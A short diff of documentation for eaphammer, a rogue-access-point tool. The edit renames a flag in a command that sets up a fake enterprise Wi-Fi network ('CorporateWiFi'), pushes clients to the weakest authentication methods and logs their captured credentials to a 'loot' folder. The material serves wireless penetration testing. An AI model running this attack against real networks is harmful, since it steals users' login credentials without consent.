@@ -68,11 +68,11 @@ cd eaphammer && ./kali-setup
   --auth wpa-eap \
   --essid CorporateWiFi \
   --channel 6 \
-  --negotiate downgrade \
+  --negotiate weakest \
   --creds
 ```
 
-`--negotiate downgrade` offers weak inner methods first (PEAP → GTC
+`--negotiate weakest` offers weak inner methods first (PEAP → GTC
 then MSCHAPv2). `--creds` logs to `loot/`.
 
 For clients that require a *specific* CA:
